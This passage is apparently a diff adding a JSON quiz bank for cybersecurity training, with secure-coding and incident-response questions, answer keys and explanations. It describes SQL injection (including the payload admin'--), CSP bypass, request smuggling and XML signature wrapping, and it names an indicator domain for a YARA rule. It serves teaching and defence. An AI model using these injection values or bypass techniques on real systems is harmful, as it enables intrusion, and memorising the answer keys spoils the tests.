+        "context": "A user registers on a website with the username `admin'--`. The application safely sanitizes this input and stores it in the database. Later, a separate administrative function retrieves this username from the database and uses it in a different, unsafe SQL query to update user logs. The `--` causes the rest of the second query to be ignored.",
+        "question": "What type of SQL injection occurs when sanitized data is stored and later used in an unsafe context?",
+        "options": [
+          "Blind SQL Injection",
+          "Union-based SQL Injection",
+          "Second-Order SQL Injection",
+          "Time-based SQL Injection"
+        ],
+        "correct": 2,
+        "explanation": "✓ This is a Second-Order SQL Injection. The initial query that stores the malicious data is safe (e.g., it uses prepared statements). The vulnerability occurs later, in a different part of the application, when that stored data is retrieved and treated as trusted, then used in an unsafe dynamic SQL query. The malicious payload is 'detonated' on the second query, not the first.\n✗ The other types of SQLi describe how the result is observed (Blind) or how data is extracted (Union), not the two-step nature of the injection.",
+        "learningPoints": [
+          "Second-Order SQLi happens when stored data is later used unsafely.",
+          "It highlights the need to treat all data, even data from your own database, as untrusted.",
+          "Consistent use of parameterized queries for all SQL statements is the best defense."
+        ],
+        "sources": [
+          "https://portswigger.net/web-security/sql-injection/second-order"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Authentication Bypass via Logic Flaw",
+        "context": "A password reset function has a multi-stage process. Step 1: User enters their email. Step 2: User answers a security question. Step 3: User sets a new password. An attacker starts the process with the victim's email. At step 2, they start a new, parallel reset process with their own email and answer their own security question. They then take the token from their own process and use it to complete the victim's process at step 3.",
+        "question": "What kind of vulnerability is being exploited?",
+        "options": [
+          "A cryptographic flaw",
+          "A business logic flaw in the state machine",
+          "A brute-force vulnerability",
+          "A denial-of-service vulnerability"
+        ],
+        "correct": 1,
+        "explanation": "✓ This is a business logic flaw. The application's state machine fails to properly bind the user's identity to all steps of the password reset process. The application validates that the user completed step 2, but not that they were the *same* user who started at step 1. This allows the attacker to mix-and-match steps from different user sessions to bypass the victim's security question and reset their password.\n✗ This is not a flaw in the cryptography itself, but in the logical process flow of the application.",
+        "learningPoints": [
+          "Business logic flaws exploit weaknesses in an application's intended workflow.",
+          "Stateful processes, like password resets, must securely tie each step to a single, verified user identity.",
+          "These vulnerabilities are often missed by automated scanners and require manual code review and testing."
+        ],
+        "sources": [
+          "https://owasp.org/www-community/vulnerabilities/Business_Logic_Errors"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Insecure Cryptography (ECB Mode)",
+        "context": "An application encrypts user-uploaded images using the AES algorithm in Electronic Codebook (ECB) mode. When an encrypted image of a penguin is viewed, the outline of the penguin is still clearly visible, even though the image is encrypted.",
+        "question": "Why is ECB mode insecure for encrypting data like images?",
+        "options": [
+          "ECB mode is too slow for image encryption.",
+          "ECB mode does not use an encryption key.",
+          "Identical plaintext blocks are encrypted into identical ciphertext blocks, preserving patterns.",
+          "ECB mode can only encrypt text, not images."
+        ],
+        "correct": 2,
+        "explanation": "✓ Electronic Codebook (ECB) is the simplest AES mode of operation. It encrypts each block of data independently. A major weakness is that identical blocks of plaintext will always encrypt to the exact same block of ciphertext. This means patterns in the original data (like the solid colors in an image) are preserved in the encrypted version, leaking significant information. It should not be used for most applications.\n✗ ECB uses a key and is fast, but its deterministic nature makes it insecure. Secure modes like CBC or GCM should be used instead.",
+        "learningPoints": [
+          "Never use ECB mode for encrypting data that may have patterns.",
+          "It is deterministic and leaks information about the plaintext.",
+          "Use modern, authenticated encryption modes like AES-GCM."
+        ],
+        "sources": [
+          "https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_(ECB)"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "CSP Bypass Techniques",
+        "context": "A website has a Content Security Policy (CSP) that allows scripts from `'self'` and `*.trusted.com`. An attacker finds that `user-uploads.trusted.com` allows users to upload JSON files, and the server returns them with the content type `application/json`. The attacker crafts a URL to a JSONP endpoint on this domain that contains their malicious script.",
+        "question": "How could this configuration be exploited to bypass the CSP?",
+        "options": [
+          "The CSP is invalid and will be ignored by the browser.",
+          "The attacker can use a JSONP endpoint on the trusted domain to execute their script, as the browser only checks the source domain, not the content.",
+          "The attacker needs to get a valid TLS certificate for `trusted.com`.",
+          "The CSP prevents all script execution, so it cannot be bypassed."
+        ],
+        "correct": 1,
+        "explanation": "✓ This is a common CSP bypass technique. The policy trusts any subdomain of `trusted.com`. If any of those subdomains has a feature that allows an attacker to control the content of a response that can be interpreted as JavaScript (like a JSONP endpoint or user-uploaded content), the attacker can host their payload there. The browser will load and execute the script because it originates from a trusted domain, effectively bypassing the intended protection.\n✗ A permissive CSP that trusts broad wildcards or domains with user-controllable content is vulnerable.",
+        "learningPoints": [
+          "Permissive CSPs with wildcards or trusting domains that host user content can be bypassed.",
+          "Attackers look for JSONP endpoints, AngularJS libraries, or file uploads on trusted domains to host their payloads.",
+          "A strong CSP should be as specific as possible about trusted script sources."
+        ],
+        "sources": [
+          "https://book.hacktricks.xyz/v/web-hacking/content-security-policy-csp-bypass"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Request Smuggling via CL.TE",
+        "context": "An application uses a front-end proxy that processes the `Content-Length` header and a back-end server that processes the `Transfer-Encoding` header. An attacker sends a single HTTP request that contains both headers. The front-end forwards the entire request based on `Content-Length`, but the back-end only processes up to the `0` indicating the end of the chunked body, leaving the rest of the data to be prepended to the next user's request.",
+        "question": "What is this type of HTTP Request Smuggling attack called?",
+        "options": [
+          "TE.CL (Transfer-Encoding front-end, Content-Length back-end)",
+          "CL.TE (Content-Length front-end, Transfer-Encoding back-end)",
+          "HTTP Parameter Pollution",
+          "Web Cache Poisoning"
+        ],
+        "correct": 1,
+        "explanation": "✓ This is a CL.TE HTTP Request Smuggling vulnerability. The name indicates how the proxy chain interprets the request: the front-end uses Content-Length (CL) and the back-end uses Transfer-Encoding (TE). This discrepancy in parsing allows the attacker to 'smuggle' a malicious request into the body of a seemingly benign one. The back-end server sees the smuggled data as the start of a new request, which gets processed with the identity of the next legitimate user in the queue.\n✗ TE.CL is the reverse scenario. The other options are different web vulnerabilities.",
+        "learningPoints": [
+          "HTTP Request Smuggling exploits inconsistencies in how proxy chains parse requests with both `Content-Length` and `Transfer-Encoding` headers.",
+          "CL.TE is one variant where the front-end proxy prioritizes `Content-Length`.",
+          "This attack can lead to session hijacking, credential theft, and bypassing security controls."
+        ],
+        "sources": [
+          "https://portswigger.net/web-security/request-smuggling"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "XML Signature Wrapping",
+        "context": "A web service accepts a digitally signed SOAP message. An attacker intercepts a valid message, moves the original signed body into a new unsigned wrapper element, and inserts their own malicious body where the original was. The application validates the signature, but then processes the malicious, unsigned body.",
+        "question": "What is this attack against XML Signatures called?",
+        "options": [
+          "XML Bomb",
+          "XML External Entity (XXE)",
+          "XPath Injection",
+          "XML Signature Wrapping (XSW)"
+        ],
+        "correct": 3,
+        "explanation": "✓ XML Signature Wrapping (XSW) is an attack that exploits a vulnerability in how XML signature validation is separated from application logic. The attacker alters the structure of an XML document without invalidating the signature. The signature validation logic correctly verifies the original, signed portion of the document, but the business logic then processes a different, attacker-controlled portion of the same document, leading to unauthorized actions.\n✗ The other options are different types of XML-based vulnerabilities.",
+        "learningPoints": [
+          "XSW attacks exploit the separation of signature validation from business logic.",
+          "The fix is to ensure that the business logic processes exactly the same data that was cryptographically signed.",
+          "This is a logic flaw in how the application interprets the signed document."
+        ],
+        "sources": [
+          "https://owasp.org/www-community/vulnerabilities/XML_Signature_Wrapping"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Excessive Data Exposure",
+        "context": "An API endpoint at `/api/users/123` returns a JSON object with user data to a mobile app. The mobile app only displays the user's `username` and `email`. However, the full JSON response also includes the user's `password_hash`, `home_address`, and `last_login_ip`.",
+        "question": "What is the vulnerability in this API design?",
+        "options": [
+          "Broken Object Level Authorization",
+          "Excessive Data Exposure",
+          "Lack of Resources & Rate Limiting",
+          "Improper Assets Management"
+        ],
+        "correct": 1,
+        "explanation": "✓ This is an example of Excessive Data Exposure. The API is returning more data than is necessary for the client application's function. Even though the app doesn't display the sensitive data, an attacker can intercept the API response (e.g., via a man-in-the-middle attack) and gain access to the password hash, address, and IP address. APIs should be designed to return only the minimal data required for a given task.\n✗ This is not an authorization issue (assuming the user is allowed to get their own data), but a data filtering issue.",
+        "learningPoints": [
+          "APIs should not expose all object properties by default.",
+          "Filter responses to include only the data necessary for the client's needs.",
+          "Excessive Data Exposure can leak sensitive information that can be used in other attacks."
+        ],
+        "sources": [
+          "https://owasp.org/www-project-api-security/2019/asvs/4.0/en/0x11-V3-Sensitive-Data"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      },
+      {
+        "title": "Authentication Flaw in Microservices",
+        "context": "A microservices architecture consists of an API Gateway and several backend services. A user authenticates to the Gateway, which then forwards requests to the backend services. One backend service, `internal-billing-api`, is accidentally exposed to the internet. It assumes all requests have been authenticated by the Gateway and does not perform its own authentication checks.",
+        "question": "What is the critical security flaw in this design?",
+        "options": [
+          "The backend service should use a different programming language.",
+          "The services are too small and should be a monolith.",
+          "The backend service fails to perform its own authentication/authorization checks, implicitly trusting the network.",
+          "The API Gateway should block all traffic."
+        ],
+        "correct": 2,
+        "explanation": "✓ In a microservices architecture, a 'Zero Trust' approach is crucial. Each service should not implicitly trust requests, even if they come from within the network or from an API Gateway. Each service should independently verify the authentication and authorization of every request it receives (e.g., by validating a JWT passed from the gateway). If a service is accidentally exposed, this lack of independent verification allows an attacker to bypass the API Gateway and interact with the service directly without any authentication.\n✗ The issue is not the language or architecture pattern, but the lack of service-level authentication.",
+        "learningPoints": [
+          "Individual microservices should not implicitly trust their callers.",
+          "Each service must perform its own authentication and authorization checks on every request.",
+          "This is a key principle of Zero Trust networking and prevents exploitation of misconfigured network paths."
+        ],
+        "sources": [
+          "https://cheatsheetseries.owasp.org/cheatsheets/Microservices_Security_Cheat_Sheet.html"
+        ],
+        "difficulty": "advanced",
+        "domain": "secure-coding"
+      }
+    ],
+    "incident-response_beginner": [
+      {
+        "title": "Order of Volatility",
+        "context": "A forensic investigator arrives at the scene of a cybersecurity incident involving a running computer. They need to collect evidence from the machine. The data in the computer's memory (RAM) will be lost if the computer is turned off, while the data on the hard drive will persist.",
+        "question": "According to the Order of Volatility, what should be collected first?",
+        "options": [
+          "Files from the hard drive.",
+          "The contents of the system's memory (RAM).",
+          "Archived backup tapes.",
+          "Logs from the network firewall."
+        ],
+        "correct": 1,
+        "explanation": "✓ The Order of Volatility is a forensic principle that dictates evidence should be collected from most volatile to least volatile. Data in CPU registers and caches is most volatile, followed by RAM, then data on persistent storage like hard drives, and finally archived data. Since RAM contents are lost on power-down, they must be collected from the live system before anything else.\n✗ Collecting from the hard drive or backups first would risk losing the crucial, ephemeral evidence in RAM.",
+        "learningPoints": [
+          "The Order of Volatility guides forensic evidence collection.",
+          "Collect from most volatile (e.g., RAM) to least volatile (e.g., hard drive, backups).",
+          "Failure to follow this order can result in the permanent loss of critical evidence."
+        ],
+        "sources": [
+          "https://www.clockedout.com/what-is-order-of-volatility/",
+          "https://www.responsum.io/the-order-of-volatility-in-a-data-breach/",
+          "https://library.mcsi.io/digital-forensics-acquiring-evidence/",
+          "https://lsa-re.github.io/posts/lsa-2-identify-order-of-volativity/",
+          "https://www.oreilly.com/library/view/digital-forensics-and/9781838648359/99a918a3-2d5d-495f-a39c-7607a9776f8e.xhtml"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Incident Documentation",
+        "context": "An incident response handler is dealing with a malware outbreak. Throughout the process, they are keeping a detailed log of every action they take, the time it was taken, and the result of the action.",
+        "question": "What is the primary reason for this meticulous documentation?",
+        "options": [
+          "To increase the time it takes to resolve the incident.",
+          "To create a detailed record for post-incident analysis, lessons learned, and potential legal proceedings.",
+          "To satisfy a personal hobby of taking notes.",
+          "To have something to read during breaks."
+        ],
+        "correct": 1,
+        "explanation": "✓ Thorough documentation is a critical part of incident response. It ensures that there is a clear and accurate record of the incident timeline, actions taken, and evidence found. This documentation is essential for the post-incident 'lessons learned' phase, for improving future responses, and as evidence if the incident leads to legal action.\n✗ The goal of documentation is to improve, not hinder, the process. It is a core professional requirement, not a hobby.",
+        "learningPoints": [
+          "Document every step taken during an incident response engagement.",
+          "Record timestamps, actions, and outcomes.",
+          "Good documentation is vital for post-incident reviews and legal evidence."
+        ],
+        "sources": [
+          "https://www.sans.org/blog/importance-of-documentation-in-incident-response/"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Incident Response Plan: Communication",
+        "context": "A company experiences a data breach involving customer information. The technical team is working on containment, but senior management needs to know who to contact in the legal department and how to notify customers.",
+        "question": "Where should this information about who to contact and what communication steps to take be defined?",
+        "options": [
+          "In the firewall's rule-base.",
+          "In the company's marketing materials.",
+          "In the official Incident Response Plan.",
+          "Nowhere, it should be decided during the incident."
+        ],
+        "correct": 2,
+        "explanation": "✓ A comprehensive Incident Response (IR) Plan is a prepared document that outlines the procedures and responsibilities for handling a security incident. A key component of this plan is the communication plan, which details who needs to be contacted (e.g., legal, HR, management, law enforcement), when, and how. This prevents confusion and chaos during a real incident.\n✗ Relying on ad-hoc decisions during a crisis is a recipe for disaster. The IR plan provides the necessary pre-approved structure.",
+        "learningPoints": [
+          "An IR plan must include a communication strategy.",
+          "Define contact points for key stakeholders (legal, HR, PR, management) in advance.",
+          "Clear communication is essential for managing the business impact of an incident."
+        ],
+        "sources": [
+          "https://www.cisa.gov/resources-tools/resources/incident-response-plan-basics",
+          "https://letsdefend.io/blog/nist-incident-response-preparation-phase/"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Preparation Phase of IR",
+        "context": "Before any incidents have occurred, a company's security team establishes a formal incident response capability. They purchase forensic software, train the response team, and pre-deploy monitoring tools across the network.",
+        "question": "According to the NIST incident response lifecycle, what is this phase called?",
+        "options": [
+          "Containment",
+          "Detection & Analysis",
+          "Post-Incident Activity",
+          "Preparation"
+        ],
+        "correct": 3,
+        "explanation": "✓ The NIST IR Lifecycle begins with Preparation. This phase involves all the activities that take place before an incident occurs to ensure the organization is ready to respond. This includes creating the plan, choosing the team, acquiring tools and training, and implementing security controls to prevent incidents.\n✗ The other phases all occur after an incident has been detected.",
+        "learningPoints": [
+          "The Preparation phase is the foundation of incident response.",
+          "It involves getting people, processes, and technology ready before an attack.",
+          "A lack of preparation will severely hamper the ability to respond effectively."
+        ],
+        "sources": [
+          "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf",
+          "https://www.ec-council.org/cybersecurity-exchange/incident-handling-and-response/nist-incident-response-life-cycle/",
+          "https://www.exabeam.com/incident-response/nist-incident-response",
+          "https://www.auditboard.com/blog/nist-incident-response/",
+          "https://www.cynet.com/incident-response/nist-incident-response-templates-and-tips/",
+          "https://letsdefend.io/blog/nist-incident-response-preparation-phase/"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Recovery Phase of IR",
+        "context": "After a server was compromised with malware, the incident response team has successfully removed the malware and patched the vulnerability that allowed the attacker in. They are now bringing the server back online and restoring its services for business use.",
+        "question": "What is this phase of the incident response process called?",
+        "options": [
+          "Recovery",
+          "Containment",
+          "Eradication",
+          "Detection"
+        ],
+        "correct": 0,
+        "explanation": "✓ The Recovery phase involves restoring systems to normal operation after a security incident. This includes activities like restoring from clean backups, rebuilding systems, applying patches, and validating that the system is secure before returning it to production use. The goal is to get the business back to normal safely.\n✗ Containment is isolating the incident. Eradication is removing the threat. Detection is identifying the incident in the first place.",
+        "learningPoints": [
+          "The Recovery phase focuses on safely restoring business operations.",
+          "This phase occurs after the threat has been eradicated.",
+          "It is important to validate that systems are secure before putting them back into production."
+        ],
+        "sources": [
+          "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf",
+          "https://www.ec-council.org/cybersecurity-exchange/incident-handling-and-response/nist-incident-response-life-cycle/"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Antivirus vs. EDR",
+        "context": "A company is evaluating two endpoint security tools. Tool A is designed to scan files for known malware signatures and block them. Tool B is designed to continuously monitor endpoint activity (like process creation and network connections) and detect suspicious behaviors.",
+        "question": "What two categories of tools are being described?",
+        "options": [
+          "Tool A is a firewall, Tool B is a proxy.",
+          "Tool A is traditional Antivirus, Tool B is an Endpoint Detection and Response (EDR) solution.",
+          "Tool A is an EDR solution, Tool B is traditional Antivirus.",
+          "Both tools are traditional Antivirus."
+        ],
+        "correct": 1,
+        "explanation": "✓ Traditional Antivirus (AV) primarily relies on signature-based detection to identify and block known malware files. Endpoint Detection and Response (EDR) is a more advanced solution that focuses on behavioral analysis. It records endpoint and network events to provide the visibility needed to detect, investigate, and respond to advanced threats, including fileless malware and novel attacks that don't have a known signature.\n✗ The descriptions clearly match the functions of traditional AV and modern EDR.",
+        "learningPoints": [
+          "Traditional AV is primarily signature-based and focused on known threats.",
+          "EDR provides deeper visibility into endpoint activity and uses behavioral analysis to find unknown threats.",
+          "EDR is a key tool for modern incident response and threat hunting."
+        ],
+        "sources": [
+          "https://www.crowdstrike.com/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Purpose of a Playbook",
+        "context": "When a SOC analyst receives an alert for a potential phishing email, they open a document that gives them a step-by-step checklist of actions: analyze the email headers, check the URL reputation, sandbox any attachments, and quarantine the message for all users if malicious.",
+        "question": "What is this type of checklist or standard operating procedure called in incident response?",
+        "options": [
+          "A chain of custody form",
+          "An executive summary",
+          "A Playbook",
+          "A network diagram"
+        ],
+        "correct": 2,
+        "explanation": "✓ An incident response playbook is a set of predefined steps and procedures to be followed for a specific type of incident (e.g., phishing, ransomware, DoS attack). Playbooks ensure a consistent, repeatable, and effective response by guiding analysts through the required actions, reducing errors and response time.\n✗ The other documents serve different purposes in forensics, reporting, and network architecture.",
+        "learningPoints": [
+          "Playbooks provide step-by-step guidance for handling specific incident types.",
+          "They help standardize and streamline the incident response process.",
+          "Common playbooks exist for phishing, malware, ransomware, and other frequent threats."
+        ],
+        "sources": [
+          "https://www.splunk.com/en_us/blog/learn/soc-playbooks.html"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Tabletop Exercise",
+        "context": "A company's incident response team gathers in a conference room. A facilitator presents them with a scenario: 'A critical server is infected with ransomware. What do you do?' The team discusses their roles, actions, and communication steps without touching any real systems.",
+        "question": "What is this type of activity called?",
+        "options": [
+          "A live fire exercise",
+          "A penetration test",
+          "A tabletop exercise",
+          "A vulnerability scan"
+        ],
+        "correct": 2,
+        "explanation": "✓ A tabletop exercise is a discussion-based session where team members meet to discuss their roles and responses during a simulated incident scenario. It is a powerful way to test and validate an incident response plan, identify gaps, and practice communication and coordination in a low-stress environment without affecting production systems.\n✗ A live fire exercise involves real systems. A penetration test is an authorized attack to find vulnerabilities. A vulnerability scan is an automated check for known flaws.",
+        "learningPoints": [
+          "Tabletop exercises are used to test and refine incident response plans.",
+          "They are discussion-based and do not involve live systems.",
+          "They help clarify roles, responsibilities, and communication pathways."
+        ],
+        "sources": [
+          "https://www.cisa.gov/resources-tools/services/cisa-tabletop-exercise-package"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Definition of a Data Breach",
+        "context": "An attacker successfully bypasses security controls and exfiltrates a database containing thousands of customer names and email addresses from a company's server. The company has now lost control of this sensitive information.",
+        "question": "How is this specific type of security incident, involving the confirmed disclosure of sensitive data, best described?",
+        "options": [
+          "A security event",
+          "A policy violation",
+          "A data breach",
+          "A vulnerability"
+        ],
+        "correct": 2,
+        "explanation": "✓ A data breach is a security incident in which sensitive, protected, or confidential data is copied, transmitted, viewed, stolen, or used by an individual unauthorized to do so. The key element is the confirmed disclosure of information, distinguishing it from other types of incidents where data may not have been compromised.\n✗ An event is any observable occurrence. An incident is a violation of policy. A data breach is a specific, high-impact type of incident.",
+        "learningPoints": [
+          "A data breach is a security incident where sensitive data has been confirmed as compromised.",
+          "Not all security incidents are data breaches.",
+          "Data breaches often have legal and regulatory notification requirements."
+        ],
+        "sources": [
+          "https://www.cisco.com/c/en/us/products/security/what-is-a-data-breach.html"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Common Attack Vector",
+        "context": "An employee receives an email that appears to be from their CEO, urgently requesting a wire transfer. The employee, wanting to be helpful, follows the instructions without verifying the request through another channel. This results in a financial loss for the company.",
+        "question": "What is the general term for the method or pathway an attacker uses to gain access to a target, such as this phishing email?",
+        "options": [
+          "An Indicator of Compromise (IoC)",
+          "A Zero-Day",
+          "An Attack Vector",
+          "A Honeypot"
+        ],
+        "correct": 2,
+        "explanation": "✓ An attack vector is the path or means by which an attacker can gain access to a computer or network server in order to deliver a payload or malicious outcome. Attack vectors enable attackers to exploit system vulnerabilities. Common attack vectors include phishing emails, malicious attachments, compromised credentials, and unpatched software.\n✗ An IoC is evidence that an attack has happened. A zero-day is a previously unknown vulnerability. A honeypot is a decoy.",
+        "learningPoints": [
+          "An attack vector is the pathway a threat takes to reach a target.",
+          "Phishing and social engineering are very common attack vectors.",
+          "Understanding common attack vectors helps in designing effective security controls."
+        ],
+        "sources": [
+          "https://www.fortinet.com/resources/cyberglossary/attack-vector"
+        ],
+        "difficulty": "beginner",
+        "domain": "incident-response"
+      }
+    ],
+    "incident-response_intermediate": [
+      {
+        "title": "Kill Chain vs. ATT&CK Framework",
+        "context": "An incident response team is analyzing an intrusion. One analyst describes the attack using a linear, seven-step model: Reconnaissance, Weaponization, Delivery, etc. Another analyst uses a large knowledge base of specific adversary techniques, such as 'PowerShell for execution' and 'Credential Dumping'.",
+        "question": "What two models are the analysts using, respectively?",
+        "options": [
+          "Both are using the Cyber Kill Chain.",
+          "The first is using the Cyber Kill Chain; the second is using the MITRE ATT&CK Framework.",
+          "The first is using the MITRE ATT&CK Framework; the second is using the Cyber Kill Chain.",
+          "Both are using the MITRE ATT&CK Framework."
+        ],
+        "correct": 1,
+        "explanation": "✓ The Cyber Kill Chain is a high-level, linear model that describes the stages of an attack from the attacker's perspective. The MITRE ATT&CK Framework is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. ATT&CK is not linear and provides much more granular detail on the specific 'how' of an attack, making it more useful for detailed analysis and detection engineering.\n✗ The descriptions clearly map to the linear nature of the Kill Chain and the technique-based nature of ATT&CK.",
+        "learningPoints": [
+          "The Cyber Kill Chain provides a high-level, sequential view of an attack.",
+          "The MITRE ATT&CK Framework is a detailed knowledge base of adversary Tactics, Techniques, and Procedures (TTPs).",
+          "ATT&CK is more comprehensive and actionable for modern threat hunting and detection."
+        ],
+        "sources": [
+          "https://www.crowdstrike.com/cybersecurity-101/cyber-attack-lifecycle/mitre-attck-vs-cyber-kill-chain/"
+        ],
+        "difficulty": "intermediate",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Live Response Forensics",
+        "context": "An analyst suspects a workstation is infected with fileless malware that only exists in memory. To investigate, they connect to the live, running machine and use specialized tools to dump the contents of RAM and collect information about running processes and network connections before powering it off.",
+        "question": "What is this process of collecting volatile data from a running system called?",
+        "options": [
+          "Dead-box forensics",
+          "Live response",
+          "Log review",
+          "Network monitoring"
+        ],
+        "correct": 1,
+        "explanation": "✓ Live response (or live forensics) involves collecting data from a computer while it is still running. This is essential for capturing volatile data, such as the contents of RAM, running processes, active network connections, and logged-on users, which would be lost if the machine were shut down. It is particularly important for investigating fileless malware and sophisticated attacks.\n✗ Dead-box forensics refers to analyzing a system after it has been powered off, typically by imaging the hard drive.",
+        "learningPoints": [
+          "Live response is necessary to capture volatile data from a running system.",
+          "It is critical for investigating incidents involving fileless malware.",
+          "Tools like KAPE, Velociraptor, and various command-line utilities are used for live response."
+        ],
+        "sources": [
+          "https://www.sans.org/white-papers/33588/"
+        ],
+        "difficulty": "intermediate",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Writing a Basic YARA Rule",
+        "context": "An incident responder is analyzing a new malware sample. They discover two unique strings inside the binary: 'malicious_mutex_123' and 'c2.evilcorp.ru'. They want to create a signature to scan other systems for files containing both of these strings.",
+        "question": "What tool would they use to write a rule with these strings and a condition like 'both of them'?",
+        "options": [
+          "Wireshark",
+          "Snort",
+          "Volatility",
+          "YARA"
+        ],
+        "correct": 3,
+        "explanation": "✓ YARA is a tool designed to help malware researchers identify and classify malware samples. It uses rules based on textual or binary patterns. A simple YARA rule can be created to look for specific strings, and the condition section can specify the logic (e.g., `uint16(0) == 0x5A4D and all of ($string_set)`) for a match. It is the standard for creating file-based malware signatures.\n✗ Wireshark analyzes network packets. Snort is a network IDS. Volatility is for memory analysis.",
+        "learningPoints": [
+          "YARA is used to create pattern-matching rules for identifying malware files.",
+          "A YARA rule consists of metadata, strings, and a condition.",
+          "These rules can be used to scan endpoints or files repositories for other instances of the same malware family."
+        ],
+        "sources": [
+          "https://yara.readthedocs.io/en/stable/writing-rules.html"
+        ],
+        "difficulty": "intermediate",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Threat Intelligence Platform (TIP)",
+        "context": "A Security Operations Center (SOC) subscribes to multiple threat intelligence feeds (open source, commercial, government). The team needs a centralized system to automatically aggregate all these feeds, de-duplicate the indicators, enrich them with context, and integrate them with their SIEM and firewalls.",
+        "question": "What type of system is designed for this purpose?",
+        "options": [
+          "A vulnerability scanner",
+          "A packet capture appliance",
+          "A Threat Intelligence Platform (TIP)",
+          "An antivirus management console"
+        ],
+        "correct": 2,
+        "explanation": "✓ A Threat Intelligence Platform (TIP) is a technology solution that collects, aggregates, and organizes threat intelligence data from multiple sources. A TIP provides security teams with information on known malware and other threats, powering efficient threat identification and response by integrating with other security tools like SIEMs, SOARs, and firewalls.\n✗ The other tools serve different functions. A TIP is specifically for managing the threat intelligence lifecycle.",
+        "learningPoints": [
+          "A TIP aggregates and manages threat intelligence from multiple feeds.",
+          "It helps to operationalize threat intelligence by integrating with other security tools.",
+          "TIPs provide context and enrichment for Indicators of Compromise."
+        ],
+        "sources": [
+          "https://www.threatconnect.com/what-is-a-threat-intelligence-platform/",
+          "https://www.microsoft.com/en-us/security/business/security-101/what-is-threat-intelligence-platform",
+          "https://www.rapid7.com/info/threat-intelligence-platforms-explained/",
+          "https://www.paloaltonetworks.com/cyberpedia/what-is-a-threat-intelligence-platform-tip",
+          "https://www.crowdstrike.com/cybersecurity-101/threat-intelligence-automation/threat-intelligence-platform-tip/"
+        ],
+        "difficulty": "intermediate",
+        "domain": "incident-response"
+      },
+      {
+        "title": "PCAP Analysis for IR",
+        "context": "An IDS alert has fired for suspicious traffic from workstation `10.1.1.50`. An incident responder has a packet capture (`.pcap`) file of the traffic from that workstation during the time of the alert. They want to reconstruct a file that was downloaded over unencrypted HTTP.",
+        "question": "What is a common tool and feature used for this type of network forensic analysis?",
+        "options": [
+          "Volatility with the `pslist` command.",
+          "YARA with a string-based rule.",
+          "Wireshark with the 'Follow TCP Stream' feature.",
+          "A SIEM with log correlation."
+        ],
+        "correct": 2,
+        "explanation": "✓ Wireshark is the de facto standard tool for analyzing packet captures (.pcap files). The 'Follow TCP Stream' feature is specifically designed to reassemble the TCP segments of a conversation in the correct order, allowing an analyst to see the application-layer data, such as an unencrypted HTTP GET request and the resulting file download.\n✗ Volatility is for memory. YARA is for files. A SIEM is for logs. Wireshark is the correct tool for PCAP analysis.",
+        "learningPoints": [
+          "Packet captures (PCAPs) provide the most detailed record of network activity.",
+          "Wireshark is a powerful tool for analyzing PCAP files.",
+          "The 'Follow TCP Stream' function can be used to reconstruct application-layer data from a session."
+        ],
+        "sources": [
+          "https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowTCPStream.html"
+        ],
+        "difficulty": "intermediate",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Eradication Challenges",
+        "context": "An incident response team is dealing with an advanced malware infection. They re-image one infected machine, but a few hours later, it is reinfected. They discover the malware has multiple persistence mechanisms, including scheduled tasks and WMI event subscriptions, and it is also spreading from other infected hosts on the network.",
+        "question": "What does this scenario highlight about the eradication phase?",
+        "options": [
+          "Eradication is the easiest part of incident response.",
+          "Simply re-imaging one machine is always sufficient.",
+          "Effective eradication requires identifying and removing all of the attacker's persistence mechanisms and footholds before recovery.",
+          "The recovery phase should always come before eradication."
+        ],
+        "correct": 2,
+        "explanation": "✓ This scenario illustrates that eradication can be complex. For an effective and lasting eradication, the response team must have a complete picture of the compromise. This includes all infected hosts and all methods the attacker is using to maintain persistence. Simply cleaning one symptom without addressing the root cause and all footholds will result in rapid reinfection.\n✗ Eradication must come before recovery to prevent reinfection. Simply re-imaging a single host is often not enough for a widespread or advanced threat.",
+        "learningPoints": [
+          "Successful eradication depends on a thorough initial investigation.",
+          "You must identify and remove all attacker persistence mechanisms.",
+          "Failing to fully eradicate the threat before recovery will lead to reinfection."
+        ],
+        "sources": [
+          "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf"
+        ],
+        "difficulty": "intermediate",
+        "domain": "incident-response"
+      },
+      {
+        "title": "Volatility of Evidence",
+        "context": "An incident responder needs to preserve evidence from a compromised server. They must decide whether to pull the power cord or perform a graceful shutdown. They know that a graceful shutdown will overwrite temporary files and stop running processes, but pulling the cord might cause file system corruption.",
+        "question": "This decision-making process is primarily concerned with what forensic concept?",
+        "options": [
+          "Chain of Custody",
+          "The volatility of digital evidence",
